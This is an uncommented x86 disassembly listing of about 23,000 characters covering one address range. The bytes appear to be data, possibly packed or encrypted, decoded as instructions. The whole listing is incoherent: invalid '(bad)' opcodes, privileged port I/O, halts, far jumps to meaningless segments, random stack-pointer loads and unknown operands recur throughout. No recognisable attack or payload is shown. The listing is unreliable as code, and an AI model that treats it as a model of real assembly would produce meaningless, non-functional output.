  4194fc:	call   0x84e99ae0
  419501:	mov    ecx,0xe47718be
  419506:	outs   dx,BYTE PTR ds:[esi]
  419507:	sub    bl,BYTE PTR [esp+ebx*2+0x7ceb7300]
  41950e:	mov    ah,0x58
  419510:	out    dx,al
  419511:	jl     0x41951b
  419513:	push   0xffffffb7
  419515:	or     bh,BYTE PTR [ecx-0x47]
  419518:	inc    eax
  419519:	push   ebx
  41951a:	pop    es
  41951b:	addr16 hlt 
  41951d:	mov    ax,0x41b4
  419521:	jl     0x4194de
  419523:	xchg   ecx,eax
  419524:	das    
  419525:	mov    dl,0xdf
  419527:	xchg   edi,eax
  419528:	add    BYTE PTR [ecx+0x7c],bh
  41952b:	mov    edi,0xee170a4f
  419530:	and    esi,0x53c8c89e
  419536:	dec    edi
  419537:	cmp    BYTE PTR [esi+0x54],bh
  41953a:	aaa    
  41953b:	out    dx,eax
  41953c:	fcom   st(5)
  41953e:	inc    esp
  41953f:	nop
  419540:	inc    edx
  419541:	sub    eax,0x8ee16a75
  419546:	pushf  
  419547:	or     eax,0x5eb3c3da
  41954c:	and    ah,BYTE PTR [ebp-0x1b7fe69d]
  419552:	aaa    
  419553:	outs   dx,BYTE PTR ds:[esi]
  419554:	mov    BYTE PTR [ebp+edi*8+0xe9581e1],dh
  41955b:	add    BYTE PTR [ebx+0x9],ah
  41955e:	mov    edx,ecx
  419560:	mov    BYTE PTR [edi-0x645ff167],dh
  419566:	std    
  419567:	jno    0x41952d
  419569:	and    eax,0x69b07392
  41956e:	cmp    edi,DWORD PTR [ecx+eiz*8]
  419571:	or     al,0x39
  419573:	not    ch
  419575:	mov    esp,0x3923536f
  41957a:	shr    DWORD PTR [edx+0x5170b205],1
  419580:	mov    esp,0xc9467d4c
  419585:	add    al,0xe1
  419587:	mov    WORD PTR [ebp+0x30],ds
  41958a:	adc    DWORD PTR [ecx+0x7d3c0989],eax
  419590:	sti    
  419591:	ret    
  419592:	xchg   BYTE PTR [ecx+eiz*4-0x71],bl
  419596:	sbb    bh,BYTE PTR [ebx+ebx*8-0x52da20c0]
  41959d:	xor    ch,dl
  41959f:	push   0x31675a69
  4195a4:	sbb    edx,esp
  4195a6:	scas   eax,DWORD PTR es:[edi]
  4195a7:	jmp    0x83c6c279
  4195ac:	nop
  4195ad:	out    dx,eax
  4195ae:	popa   
  4195af:	xchg   bl,al
  4195b1:	push   ss
  4195b2:	or     esp,DWORD PTR [edx]
  4195b4:	and    eax,0xce7accd2
  4195b9:	add    esi,edx
  4195bb:	push   0x29ff9a4
  4195c0:	mov    edx,0x8ece4ea5
  4195c5:	repz mov ebp,0x60bdd78d
  4195cb:	mov    ebp,0xbb987ca0
  4195d0:	sar    DWORD PTR [ebx+0x3],0x7b
  4195d4:	nop
  4195d5:	cld    
  4195d6:	dec    edi
  4195d7:	int    0xb4
  4195d9:	and    al,0x35
  4195db:	jno    0x4195eb
  4195dd:	mov    ebx,0xefe0a9f7
  4195e2:	mov    bh,0xd0
  4195e4:	test   eax,0xa5722271
  4195e9:	cmc    
  4195ea:	cmp    eax,0x30249f4b
  4195ef:	jecxz  0x41958b
  4195f1:	cmp    eax,0x4c64080a
  4195f6:	loop   0x41966a
  4195f8:	loop   0x4195f9
  4195fa:	sbb    edi,ecx
  4195fc:	fiadd  WORD PTR [ecx]
  4195fe:	shl    BYTE PTR [edi+0xc5ddcdd],cl
  419604:	mov    bl,0x79
  419606:	mov    ds,WORD PTR [ecx-0xdfc2f26]
  41960c:	or     eax,0x1a425a86
  419611:	imul   ebp,DWORD PTR ds:0x2c47b8d7,0x901d3717
  41961b:	xor    BYTE PTR [ebp-0x2d9bd543],al
  419621:	lock into 
  419623:	imul   bl
  419625:	jmp    0xe66b5e77
  41962a:	or     BYTE PTR [edi-0x63],0xed
  41962e:	sar    dl,1
  419630:	jno    0x419695
  419632:	fiadd  WORD PTR [esi]
  419634:	lea    ecx,[edx+0x5bffc89]
  41963a:	dec    esi
  41963b:	sahf   
  41963c:	add    ecx,esp
  41963e:	add    esp,DWORD PTR [esi+0x7a08a148]
  419644:	mov    ecx,0x25d8e307
  419649:	lods   eax,DWORD PTR ds:[esi]
  41964a:	in     al,dx
  41964b:	push   esp
  41964c:	xchg   esi,eax
  41964d:	mov    cl,BYTE PTR ds:0xe4f0825
  419653:	retf   
  419654:	cmp    eax,DWORD PTR [ecx-0x6c]
  419657:	repnz into 
  419659:	add    ebp,DWORD PTR [ebx-0x5d]
  41965c:	pop    ss
  41965d:	cld    
  41965e:	mov    cl,0xa4
  419660:	xchg   BYTE PTR [ecx+0x36],cl
  419663:	imul   esi,DWORD PTR [ecx],0x55
  419666:	or     DWORD PTR [ecx],ecx
  419668:	or     edx,DWORD PTR [ecx-0x38]
  41966b:	mov    al,0xf8
  41966d:	xchg   esi,eax
  41966e:	fst    QWORD PTR [edx+0x17]
  419671:	adc    edi,DWORD PTR [esi]
  419673:	xchg   edi,eax
  419674:	in     al,dx
  419675:	dec    ecx
  419676:	retf   
  419677:	and    ebx,edi
  419679:	xchg   edi,eax
  41967a:	push   cs
  41967b:	inc    ebp
  41967c:	mov    esp,0x6cd8c303
  419681:	pop    ss
  419682:	ja     0x4196ac
  419684:	mov    WORD PTR [ebx],ds
  419686:	push   ebx
  419687:	stos   BYTE PTR es:[edi],al
  419688:	nop
  419689:	stos   DWORD PTR es:[edi],eax
  41968a:	and    DWORD PTR [edx-0x72c72eb4],esi
  419690:	repz ret 
  419692:	fwait
  419693:	ret    
  419694:	mov    ?,ebp
  419696:	or     eax,0x354008d1
  41969b:	sub    al,0x4b
  41969d:	jae    0x4196ee
  41969f:	mov    BYTE PTR [ecx],bh
  4196a1:	xchg   edi,eax
  4196a2:	sub    eax,0xda01c6e5
  4196a7:	cwde   
  4196a8:	fldcw  WORD PTR [eax-0x58b0aad5]
  4196ae:	xchg   ecx,edi
  4196b0:	jno    0x419731
  4196b2:	dec    esp
  4196b3:	mov    edi,0x3eba1c22
  4196b8:	fs sbb al,0xd
  4196bb:	xlat   BYTE PTR ds:[ebx]
  4196bc:	xchg   ebx,eax
  4196bd:	and    DWORD PTR [ecx+0x6ba3f58c],ecx
  4196c3:	stos   DWORD PTR es:[edi],eax
  4196c4:	push   ebp
  4196c5:	add    DWORD PTR [edi],edi
  4196c7:	xor    edi,DWORD PTR [eax]
  4196c9:	mov    eax,ds:0xb7e3a29e
  4196ce:	dec    ebx
  4196cf:	mov    cl,0x65
  4196d1:	cwde   
  4196d2:	add    ch,dl
  4196d4:	loop   0x419737
  4196d6:	inc    edx
  4196d7:	sbb    DWORD PTR [ecx],eax
  4196d9:	add    edx,DWORD PTR [ebp+0x4d]
  4196dc:	dec    eax
  4196dd:	in     al,dx
  4196de:	xchg   DWORD PTR [eax+ebp*4],ecx
  4196e1:	mov    cl,0x73
  4196e3:	pop    ebp
  4196e4:	ret    0x4b12
  4196e7:	push   ds
  4196e8:	cmp    edx,DWORD PTR [esi]
  4196ea:	mov    ecx,0xf17efbfb
  4196ef:	jecxz  0x419679
  4196f1:	hlt    
  4196f2:	aaa    
  4196f3:	stc    
  4196f4:	cmp    BYTE PTR [eax+ebx*4-0x77],ch
  4196f8:	lds    eax,FWORD PTR [eax]
  4196fa:	add    al,0x18
  4196fc:	inc    eax
  4196fd:	adc    al,0x5c
  4196ff:	lods   eax,DWORD PTR ds:[esi]
  419700:	inc    ecx
  419701:	jge    0x419731
  419703:	push   esi
  419704:	jecxz  0x4196f3
  419706:	jnp    0x419742
  419708:	xchg   esp,eax
  419709:	push   eax
  41970a:	ds dec ecx
  41970c:	(bad)  
  41970d:	mov    ch,0x52
  41970f:	xor    DWORD PTR [edi-0x4320f5b3],eax
  419715:	nop
  419716:	stos   DWORD PTR es:[edi],eax
  419717:	mov    esi,0xb6ad69ad
  41971c:	adc    dh,BYTE PTR [ebx+0x70699636]
  419722:	cmp    al,BYTE PTR [edi+0x28]
  419725:	dec    eax
  419726:	dec    ebx
  419727:	mov    ebp,0xf15b9949
  41972c:	mov    ebx,0x7f7839ee
  419731:	sub    al,0xdc
  419733:	adc    ah,BYTE PTR [edx-0x161e3549]
  419739:	mov    al,0x6b
  41973b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41973c:	pop    esp
  41973d:	mov    dl,0x7c
  41973f:	call   DWORD PTR [ecx+0x68]
  419742:	pop    es
  419743:	ja     0x419745
  419745:	add    edx,eax
  419747:	mov    ch,0x89
  419749:	loopne 0x419765
  41974b:	cs pop ebx
  41974d:	mov    ch,0x12
  41974f:	out    0x58,al
  419751:	mov    BYTE PTR [ecx],dh
  419753:	mov    ecx,0x12d6023a
  419758:	push   edx
  419759:	add    dl,BYTE PTR [ebp-0xd]
  41975c:	stos   DWORD PTR es:[edi],eax
  41975d:	mov    edx,0x25533c55
  419762:	shl    BYTE PTR [edi],0x7
  419765:	stos   BYTE PTR es:[edi],al
  419766:	adc    DWORD PTR [edi+ebp*1],ebx
  419769:	sbb    cl,al
  41976b:	stos   BYTE PTR es:[edi],al
  41976c:	inc    esp
  41976d:	pop    ebx
  41976e:	cmp    BYTE PTR [edx+edx*8],0x77
  419772:	or     eax,0x3a22f642
  419777:	stos   BYTE PTR es:[edi],al
  419778:	outs   dx,DWORD PTR ds:[esi]
  419779:	dec    ebx
  41977a:	push   ecx
  41977b:	ins    BYTE PTR es:[edi],dx
  41977c:	or     al,bh
  41977e:	xor    eax,DWORD PTR [ebx]
  419780:	push   eax
  419781:	and    dh,al
  419783:	ret    
  419784:	(bad)
  419788:	xchg   edi,eax
  419789:	xor    eax,DWORD PTR [ecx+0x42]
  41978c:	dec    edi
  41978d:	mov    eax,?
  41978f:	jmp    0x7211:0xf6216274
  419796:	out    dx,al
  419797:	dec    eax
  419798:	and    al,0xf7
  41979a:	sbb    ecx,0x3dee5e0f
  4197a0:	in     al,0x9d
  4197a2:	cwde   
  4197a3:	outs   dx,DWORD PTR ds:[esi]
  4197a4:	mov    edi,0xa40e182d
  4197a9:	adc    eax,0x693af053
  4197ae:	mov    bl,0x87
  4197b0:	jmp    0x4197f9
  4197b2:	loop   0x419772
  4197b4:	cld    
  4197b5:	out    0x52,eax
  4197b7:	retf   0x7a64
  4197ba:	fs xchg edx,eax
  4197bc:	iret   
  4197bd:	mov    esi,0xe1ffb293
  4197c2:	loope  0x41976e
  4197c4:	inc    esi
  4197c5:	nop
  4197c6:	dec    ecx
  4197c7:	pop    esi
  4197c8:	ret    0x8eeb
  4197cb:	adc    ch,BYTE PTR [esi]
  4197cd:	ja     0x4197ee
  4197cf:	mov    al,0xbf
  4197d1:	jmp    0xdd4c:0xbf9a5ed2
  4197d8:	(bad)  
  4197d9:	push   0x1a13c2b8
  4197de:	push   0x4d9c364d
  4197e3:	iret   
  4197e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197e5:	adc    DWORD PTR [ebx+eax*2-0x70],esi
  4197e9:	std    
  4197ea:	cld    
  4197eb:	pop    ss
  4197ec:	jo     0x419840
  4197ee:	dec    ebx
  4197ef:	shl    BYTE PTR [ebx-0x36],0x7b
  4197f3:	lahf   
  4197f4:	sbb    al,0x2a
  4197f6:	arpl   WORD PTR [ebp+0x1537aaed],di
  4197fc:	or     BYTE PTR [edi-0x1c],ah
  4197ff:	loope  0x4197d7
  419801:	retf   
  419802:	test   ebx,edi
  419804:	mov    ah,0xb0
  419806:	sub    ch,BYTE PTR ds:0xf07b4239
  41980c:	xchg   edi,eax
  41980d:	xchg   edi,eax
  41980e:	sub    esi,esi
  419810:	or     esp,ebp
  419812:	mov    ecx,0xd6bf4769
  419817:	xchg   ebx,eax
  419818:	jmp    0xd68d:0xdf82d7ba
  41981f:	pop    eax
  419820:	push   ss
  419821:	daa    
  419822:	and    eax,0x6915d0ba
  419827:	adc    eax,0xbfd7f3be
  41982c:	mov    bl,0xce
  41982e:	sbb    DWORD PTR [ebp-0x61848b7d],0xec72306b
  419838:	sub    BYTE PTR [ebp+eiz*8+0x11796e1d],bl
  41983f:	in     eax,dx
  419840:	and    eax,DWORD PTR [eax+0x24]
  419843:	sub    ebp,ebx
  419845:	push   ecx
  419846:	cmp    ch,BYTE PTR [ebx]
  419848:	and    BYTE PTR [esi+0x3],0x35
  41984c:	jmp    0x41986f
  41984e:	in     al,0xc5
  419850:	or     DWORD PTR [eax*8+0x76736f76],ebx
  419857:	pop    esp
  419858:	add    dl,BYTE PTR [ebx-0x29121288]
  41985e:	pushf  
  41985f:	ret    0xea55
  419862:	dec    edi
  419863:	popf   
  419864:	shl    dl,1
  419866:	xchg   DWORD PTR [eax],esi
  419868:	pop    es
  419869:	add    DWORD PTR [ebp+0x2ddd0517],edx
  41986f:	cmp    BYTE PTR [ebx],0xa2
  419872:	add    eax,0x7c0fe2ed
  419877:	pop    ebx
  419878:	out    dx,eax
  419879:	ret    0xa976
  41987c:	xor    BYTE PTR [esi],cl
  41987e:	dec    edi
  41987f:	pop    es
  419880:	mov    al,0x74
  419882:	in     al,0xb7
  419884:	or     eax,esi
  419886:	fld    TBYTE PTR [eax+0x0]
  419889:	ja     0x41981e
  41988b:	sbb    DWORD PTR [edx+0xc3486c0],0xffffff85
  419892:	stc    
  419893:	dec    esi
  419894:	into   
  419895:	fild   QWORD PTR [ebx+0x591a576a]
  41989b:	or     eax,DWORD PTR [ebx]
  41989d:	sti    
  41989e:	out    0xa4,al
  4198a0:	fild   QWORD PTR [edi]
  4198a2:	pusha  
  4198a3:	cmp    ebx,0x7b
  4198a6:	mov    ds:0xe2f1f6eb,eax
  4198ab:	mov    bh,ah
  4198ad:	into   
  4198ae:	out    0x73,eax
  4198b0:	mov    ds:0xad167c67,eax
  4198b5:	and    bh,BYTE PTR [edi]
  4198b7:	jmp    FWORD PTR [esi]
  4198b9:	lds    ecx,FWORD PTR [esi-0x7120bbba]
  4198bf:	sar    DWORD PTR [esi+0x58],1
  4198c2:	out    0xfc,eax
  4198c4:	xchg   ecx,eax
  4198c5:	push   0xb8855e87
  4198ca:	bound  esi,QWORD PTR [ebp-0x3]
  4198cd:	xor    bh,BYTE PTR [esi-0x49c8b2fc]
  4198d3:	inc    ebp
  4198d4:	mov    ss,edi
  4198d6:	repnz pop ebp
  4198d8:	xchg   edx,eax
  4198d9:	pop    esi
  4198da:	das    
  4198db:	pop    ebp
  4198dc:	dec    esi
  4198dd:	sbb    BYTE PTR [ebx],0x89
  4198e0:	icebp  
  4198e1:	xchg   edi,eax
  4198e2:	dec    edi
  4198e3:	pop    ebx
  4198e4:	(bad)  
  4198e6:	icebp  
  4198e7:	adc    edi,DWORD PTR [eax-0x30]
  4198ea:	je     0x41991a
  4198ec:	dec    ebp
  4198ed:	jns    0x41993e
  4198ef:	cmp    al,0x56
  4198f1:	pop    eax
  4198f2:	jmp    FWORD PTR [ebx+esi*1]
  4198f5:	or     DWORD PTR [ecx+ebx*2+0x37],esp
  4198f9:	cs sbb eax,0xa3924dd0
  4198ff:	push   ebp
  419900:	addr16 in eax,dx
  419902:	fdiv   QWORD PTR [ebx+0x38415ee9]
  419908:	mov    dl,0xdf
  41990a:	dec    esp
  41990b:	cdq    
  41990c:	sub    ebp,DWORD PTR [ecx+0x2948f0e8]
  419912:	push   ds
  419913:	mov    esp,0x812c5f1b
  419918:	dec    DWORD PTR [esi-0x3]
  41991b:	mov    al,ds:0x4978f354
  419920:	mov    ebx,DWORD PTR [edx-0x5f6035ed]
  419926:	add    al,0xfd
  419928:	pop    esp
  419929:	adc    DWORD PTR [ebx],esp
  41992b:	clc    
  41992c:	push   ebp
  41992d:	popa   
  41992e:	ins    DWORD PTR es:[edi],dx
  41992f:	mul    DWORD PTR [ebp-0x3d307dea]
  419935:	xchg   ecx,eax
  419936:	cmp    al,0xb1
  419938:	push   edx
  419939:	sub    eax,0x37b09909
  41993e:	fwait
  41993f:	ret    
  419940:	aam    0xe3
  419942:	repz add DWORD PTR [edx+0x805dba1],edx
  419949:	daa    
  41994a:	call   0xbc03:0x7c126112
  419951:	shl    DWORD PTR [ebx+0x7cfd422f],cl
  419957:	xchg   ebp,eax
  419958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419959:	cdq    
  41995a:	lds    ebp,FWORD PTR [esi+edi*4]
  41995d:	addr16 leave 
  41995f:	lods   eax,DWORD PTR ds:[esi]
  419960:	mov    al,0x99
  419962:	rol    DWORD PTR [ecx+0x12],0x29
  419966:	mov    ecx,0x5807b62d
  41996b:	cli    
  41996c:	int    0x48
  41996e:	pop    esi
  41996f:	cwde   
  419970:	jmp    0xd1d7e604
  419975:	(bad)  
  419976:	mov    ch,0xba
  419978:	and    esp,edi
  41997a:	sbb    al,0xdb
  41997c:	cmc    
  41997d:	inc    ecx
  41997e:	push   edx
  41997f:	jns    0x419926
  419981:	fdiv   QWORD PTR fs:[ebx+ecx*8]
  419985:	mov    ebp,0x50674150
  41998a:	sbb    bh,0x8f
  41998d:	push   ebp
  41998e:	dec    edx
  41998f:	mov    cl,0x6d
  419991:	int3   
  419992:	and    eax,0xd9c36ecb
  419997:	cdq    
  419998:	(bad)  
  419999:	test   dl,dl
  41999b:	adc    BYTE PTR [edx-0x3c],dh
  41999e:	iret   
  41999f:	mov    al,0xab
  4199a1:	push   ebp
  4199a2:	adc    al,0x4f
  4199a4:	bound  esi,QWORD PTR [esp+edx*2+0x147f351e]
  4199ab:	cmp    DWORD PTR [ebx+esi*8-0x4b0c13ab],ebp
  4199b2:	add    cl,BYTE PTR [ebx]
  4199b4:	pop    esp
  4199b5:	sbb    ebx,DWORD PTR ds:0xbd96f1e0
  4199bb:	dec    ecx
  4199bc:	add    bl,ch
  4199be:	sbb    ebp,DWORD PTR [edx-0x53]
  4199c1:	icebp  
  4199c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199c3:	data16 mov bh,0xa6
  4199c6:	int    0xd5
  4199c8:	dec    ebp
  4199c9:	out    0x81,eax
  4199cb:	sbb    eax,0xefa110b6
  4199d0:	push   ss
  4199d1:	mov    eax,0x57e9ffdb
  4199d6:	mov    ds:0xef6a338f,al
  4199db:	out    0x62,eax
  4199dd:	cs push ebp
  4199df:	popf   
  4199e0:	push   eax
  4199e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199e2:	inc    ecx
  4199e3:	outs   dx,BYTE PTR ds:[esi]
  4199e4:	pop    es
  4199e5:	ins    DWORD PTR es:[edi],dx
  4199e6:	jns    0x4199fc
  4199e8:	in     eax,dx
  4199e9:	jle    0x4199a5
  4199eb:	cmp    al,0xb0
  4199ed:	nop
  4199ee:	loope  0x419a36
  4199f0:	xchg   ah,al
  4199f2:	cli    
  4199f3:	rcr    BYTE PTR [esi],0xdb
  4199f6:	hlt    
  4199f7:	inc    edx
  4199f8:	leave  
  4199f9:	int3   
  4199fa:	loop   0x419a69
  4199fc:	mov    cl,0xc
  4199fe:	jg     0x419a47
  419a00:	(bad)  
  419a01:	cmp    DWORD PTR [ebx],ebp
  419a03:	inc    ebx
  419a04:	jl     0x419a4a
  419a06:	call   0x15b67484
  419a0b:	jp     0x41998e
  419a0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a0e:	and    BYTE PTR [ebp+0x1e],dl
  419a11:	loope  0x4199f1
  419a13:	mov    ah,0x3d
  419a15:	stos   BYTE PTR es:[edi],al
  419a16:	cmp    bl,ah
  419a18:	cmp    eax,DWORD PTR [esi]
  419a1a:	imul   bp,WORD PTR [edx-0x6309e2ed],0x22
  419a22:	sbb    al,0xaa
  419a24:	sub    DWORD PTR [edi+0x31],edi
  419a27:	cmp    al,0x31
  419a29:	adc    bh,dh
  419a2b:	adc    eax,0x6f4380b4
  419a30:	icebp  
  419a31:	xor    DWORD PTR [edx-0x7972beab],esp
  419a37:	cli    
  419a38:	push   esi
  419a39:	(bad)  
  419a3a:	mov    esp,0x2891bf24
  419a3f:	pop    edi
  419a40:	outs   dx,BYTE PTR ds:[esi]
  419a41:	dec    ecx
  419a42:	clc    
  419a43:	and    eax,0xd8377901
  419a48:	lods   al,BYTE PTR ds:[esi]
  419a49:	and    eax,0xa51df1b2
  419a4e:	fsubr  DWORD PTR [esi+0x185a717e]
  419a54:	pop    edx
  419a55:	shl    BYTE PTR [esi+0x22],cl
  419a58:	cmovbe eax,DWORD PTR [ecx]
  419a5b:	ret    
  419a5c:	mov    DWORD PTR [esi-0x5a],ebx
  419a5f:	retf   0x80bf
  419a62:	cli    
  419a63:	cmp    ch,BYTE PTR [eax]
  419a65:	mov    ds:0x4b2bf22b,eax
  419a6a:	inc    eax
  419a6b:	xchg   ebx,eax
  419a6c:	fldenv [ebx]
  419a6e:	aad    0xff
  419a70:	jo     0x419ada
  419a72:	test   BYTE PTR [esi],ah
  419a74:	or     BYTE PTR ds:0x55c83781,ah
  419a7a:	ja     0x419a8e
  419a7c:	jmp    0x419a8b
  419a7e:	xchg   BYTE PTR [eax+0xff30be9],cl
  419a84:	add    al,0x2f
  419a86:	fsubr  st,st(1)
  419a88:	fnstsw WORD PTR [eax-0x2bc2aef]
  419a8e:	jns    0x419aa6
  419a90:	sbb    BYTE PTR [ebp-0x609320b1],ch
  419a96:	and    ecx,esp
  419a98:	pop    esp
  419a99:	lahf   
  419a9a:	neg    BYTE PTR [edi]
  419a9c:	or     ebx,DWORD PTR ds:0xf3a6278f
  419aa2:	xor    eax,0x3ed2d3a1
  419aa7:	lods   al,BYTE PTR ds:[esi]
  419aa8:	xchg   DWORD PTR [ebp-0x229e3f27],esi
  419aae:	sbb    eax,0x299103b6
  419ab3:	call   0xf3cd:0x92f0cf34
  419aba:	xor    DWORD PTR [ebx],edx
  419abc:	dec    esi
  419abd:	mov    esp,0xb75094d4
  419ac2:	cmp    esp,ecx
  419ac4:	mov    al,ds:0xcdd738ae
  419ac9:	mov    WORD PTR [ebx-0x683afacd],ss
  419acf:	mov    edx,0x995ad928
  419ad4:	cli    
  419ad5:	call   0xb9c4:0x8ce5fe3e
  419adc:	xchg   ecx,eax
  419add:	(bad)  
  419ade:	inc    edi
  419adf:	ins    DWORD PTR es:[edi],dx
  419ae0:	int3   
  419ae1:	ins    DWORD PTR es:[edi],dx
  419ae2:	shr    DWORD PTR [ebx+0x71],0x83
  419ae6:	es push esp
  419ae8:	aaa    
  419ae9:	jnp    0x419a76
  419aeb:	lock hlt 
  419aed:	pop    ebx
  419aee:	jle    0x419b14
  419af0:	rcl    ecx,0xf0
  419af3:	push   esi
  419af4:	xor    ecx,esi
  419af6:	cmp    ecx,DWORD PTR [esi+0xdf01bcc]
  419afc:	fsin   
  419afe:	sbb    eax,0x2353ddfd
  419b03:	pop    ss
  419b04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b05:	imul   eax,edi,0x4
  419b08:	scas   eax,DWORD PTR es:[edi]
  419b09:	xchg   edx,eax
  419b0a:	dec    edx
  419b0b:	and    ebx,DWORD PTR [ecx+0x6b]
  419b0e:	push   0x3f1afa20
  419b13:	inc    edi
  419b14:	mov    sp,0x921
  419b18:	sbb    dh,BYTE PTR [ecx+0x56]
  419b1b:	mov    eax,ds:0xccd0b7b6
  419b20:	call   0xd428:0xce8a2d2c
  419b27:	in     al,dx
  419b28:	fisub  DWORD PTR [ebx-0x20a672be]
  419b2e:	mov    ch,0x2d
  419b30:	je     0x419b91
  419b32:	out    0xe3,al
  419b34:	test   eax,0x5a8a78cc
  419b39:	push   0xffffffa0
  419b3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b3c:	cmp    al,0x6f
  419b3e:	inc    esp
  419b3f:	xchg   ecx,eax
  419b40:	sahf   
  419b41:	mov    dl,0x57
  419b43:	test   al,0xaa
  419b45:	mov    dl,0x3
  419b47:	into   
  419b48:	fwait
  419b49:	out    0xbf,eax
  419b4b:	bound  ecx,QWORD PTR [esi-0x323f5439]
  419b51:	dec    BYTE PTR ds:0xcfebe13
  419b57:	icebp  
  419b58:	mov    ebx,0x53b6c050
  419b5d:	in     eax,0xf
  419b5f:	pop    ss
  419b60:	jmp    0x7990:0xea03310f
  419b67:	(bad)  
  419b68:	jnp    0x419b44
  419b6a:	outs   dx,BYTE PTR ds:[esi]
  419b6b:	cs inc ebx
  419b6d:	lods   al,BYTE PTR ds:[esi]
  419b6e:	inc    esp
  419b6f:	retf   0x243d
  419b72:	cdq    
  419b73:	mov    al,ds:0xd1bb1452
  419b78:	push   0x9ac87cf
  419b7d:	out    dx,al
  419b7e:	stc    
  419b7f:	jge    0x419b30
  419b81:	fcmovu st,st(3)
  419b83:	out    dx,eax
  419b84:	inc    eax
  419b85:	les    edx,FWORD PTR [esi]
  419b87:	ds ret 0x8c7
  419b8b:	inc    esi
  419b8c:	out    dx,eax
  419b8d:	cmc    
  419b8e:	cs jg  0x419bc9
  419b91:	jecxz  0x419b5a
  419b93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b94:	xlat   BYTE PTR ds:[ebx]
  419b95:	lods   al,BYTE PTR ds:[esi]
  419b96:	call   0xc2d:0x37607362
  419b9d:	rol    DWORD PTR [edi],0xa5
  419ba0:	(bad)  
  419ba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ba2:	and    bh,BYTE PTR [ebx]
  419ba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ba5:	(bad)  [edi]
  419ba7:	and    ebx,esp
  419ba9:	xchg   ebp,eax
  419baa:	sub    eax,0x1a15b45c
  419baf:	fsubrp st(3),st
  419bb1:	out    dx,eax
  419bb2:	or     eax,0xcad16a74
  419bb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bb8:	retf   
  419bb9:	test   DWORD PTR [ebp-0x681480a],ecx
  419bbf:	xor    ah,BYTE PTR [edi+0x13]
  419bc2:	(bad)  
  419bc3:	cwde   
  419bc4:	cmp    eax,eax
  419bc6:	mov    ch,0x1b
  419bc8:	cs loope 0x419b77
  419bcb:	xor    ebp,ecx
  419bcd:	dec    cx
  419bcf:	adc    ebx,edi
  419bd1:	popa   
  419bd2:	sbb    al,0x9
  419bd4:	stos   BYTE PTR es:[edi],al
  419bd5:	and    eax,0x7294e618
  419bda:	test   al,0xa
  419bdc:	cmp    al,BYTE PTR [edi+0x7a]
  419bdf:	inc    ebp
  419be0:	or     al,BYTE PTR [eax-0x36]
  419be3:	cli    
  419be4:	into   
  419be5:	imul   ebx,DWORD PTR [esi-0x37667089],0x8aeaf282
  419bef:	cmp    dh,bl
  419bf1:	out    0x53,al
  419bf3:	inc    ebp
  419bf4:	mov    eax,0xf9db577
  419bf9:	push   edi
  419bfa:	pop    eax
  419bfb:	dec    esi
  419bfc:	cmp    bl,BYTE PTR [edi-0x4f484967]
  419c02:	or     DWORD PTR [eax+edx*2-0x21],edx
  419c06:	ja     0x419c13
  419c08:	sub    esp,eax
  419c0a:	outs   dx,BYTE PTR ds:[esi]
  419c0b:	aaa    
  419c0c:	xchg   esi,eax
  419c0d:	fsub   st(5),st
  419c0f:	fstp   QWORD PTR [eax+esi*2-0x3f]
  419c13:	shr    BYTE PTR [edi+0x64],0x7a
  419c17:	loopne 0x419bb5
  419c19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c1a:	xchg   edx,eax
  419c1b:	stc    
  419c1c:	neg    DWORD PTR [edi+0x50]
  419c1f:	xchg   DWORD PTR [edi],eax
  419c21:	out    dx,al
  419c22:	xchg   ebx,eax
  419c23:	jne    0x419c83
  419c25:	les    esp,FWORD PTR [edx]
  419c27:	(bad)  
  419c28:	js     0x419c50
  419c2a:	ja     0x419c1f
  419c2c:	cmp    eax,0xe376b45d
  419c31:	xchg   esp,eax
  419c32:	imul   DWORD PTR [esi+ecx*8+0x3d8e8898]
  419c39:	ds dec eax
  419c3b:	inc    esi
  419c3c:	push   es
  419c3d:	scas   al,BYTE PTR es:[edi]
  419c3e:	ins    BYTE PTR es:[edi],dx
  419c3f:	dec    ebp
  419c40:	loop   0x419c04
  419c42:	dec    BYTE PTR [ecx-0x17]
  419c45:	or     DWORD PTR [esi-0x22],ebx
  419c48:	add    eax,0x39cde3d4
  419c4d:	dec    ecx
  419c4e:	lahf   
  419c4f:	int    0x19
  419c51:	adc    al,0x74
  419c53:	seta   dl
  419c56:	dec    ebp
  419c57:	mov    ecx,0x270834df
  419c5c:	mul    DWORD PTR [edx]
  419c5e:	dec    edx
  419c5f:	cmp    eax,0x4a8de3ae
  419c64:	ror    BYTE PTR [esi-0x24a94cc7],cl
  419c6a:	jae    0x419c16
  419c6c:	ror    DWORD PTR [edx],0x16
  419c6f:	push   edi
  419c70:	test   eax,0x31a6d86c
  419c75:	retf   
  419c76:	inc    esp
  419c77:	daa    
  419c78:	enter  0xbaa1,0xbd
  419c7c:	out    dx,al
  419c7d:	cmp    DWORD PTR [ebx],edx
  419c7f:	mov    ebx,DWORD PTR [edi+0x714ff796]
  419c85:	xchg   esp,eax
  419c86:	daa    
  419c87:	jecxz  0x419c78
  419c89:	adc    ecx,DWORD PTR [ecx]
  419c8b:	ret    
  419c8c:	leave  
  419c8d:	lods   eax,DWORD PTR ds:[esi]
  419c8e:	or     al,bh
  419c90:	add    BYTE PTR [edi-0x60d9e015],ah
  419c96:	adc    BYTE PTR [ebx-0x7dcd7c00],bh
  419c9c:	mov    ds:0xe078b84b,eax
  419ca1:	push   eax
  419ca2:	pop    esi
  419ca3:	and    bl,dh
  419ca5:	js     0x419c31
  419ca7:	in     eax,0xc5
  419ca9:	mov    ah,0xb9
  419cab:	rcl    BYTE PTR [eax+ecx*1-0x5d],cl
  419caf:	call   0xf8312e76
  419cb4:	jge    0x419c9e
  419cb6:	cdq    
  419cb7:	dec    ebp
  419cb8:	lods   al,BYTE PTR ds:[esi]
